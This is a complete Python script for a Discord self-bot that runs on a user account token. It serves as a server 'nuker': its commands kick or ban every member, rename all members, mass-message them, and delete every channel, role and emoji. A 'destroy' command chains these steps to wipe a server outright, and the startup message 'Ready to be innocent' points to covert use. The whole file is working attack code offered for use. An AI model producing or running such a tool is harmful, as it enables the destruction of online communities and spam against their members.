# CONFIG
# ---------
token = "" # To find this, it's harder than it used to be. Please Google the process.
prefix = "~" # This will be used at the start of commands.
# ----------

import discord
from discord.ext import commands
# Imports the needed libs.

print("Loading..")

bot = commands.Bot(command_prefix=prefix, self_bot=True, intents=discord.Intents.all())
bot.remove_command("help")
# Declares the bot, passes it a prefix and lets it know to (hopefully) only listen to itself.

@bot.event
async def on_ready():
    print("Ready to be innocent.")
# Prints when the bot is ready to be used.

@bot.event
async def on_message(msg):
    if msg.author != bot.user:
        return
    await bot.process_commands(msg)
# A secondary check to ensure nobody but the owner can run these commands.


@bot.command()
async def kall(ctx):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.kick()
                print(f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print(f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print("Action Completed: kall")
# Kicks every member in a server.

@bot.command()
async def ball(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
    print("Action Completed: ball")  
# Bans every member in a server.

@bot.command()
async def rall(ctx, rename_to):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.edit(nick=rename_to)
            print(f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
        except:
            print(f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
    print("Action Completed: rall")
# Renames every member in a server.

@bot.command()
async def mall(ctx, *, message):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.send(message)
            print(f"{user.name} has recieved the message.")
        except:
            print(f"{user.name} has NOT recieved the message.")
    print("Action Completed: mall")
# Messages every member in a server.

@bot.command()
async def dall(ctx, condition):
    if condition.lower() == "channels":
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        print("Action Completed: dall channels")
    elif condition.lower() == "roles":
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        print("Action Completed: dall roles")
    elif condition.lower() == "emojis":
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        print("Action Completed: dall emojis")
    elif condition.lower() == "all":
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        print("Action Completed: dall all")
# Can perform multiple actions that envolve mass deleting.

@bot.command()
async def destroy(ctx):
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
        except:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted in {ctx.guild.name}")
        except:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"{role.name} has been deleted in {ctx.guild.name}")
        except:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
    for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
    print("Action Completed: destroy")
# Outright destroys a server.

bot.run(token, bot=False)
# Starts the bot by passing it a token and telling it it isn't really a bot.
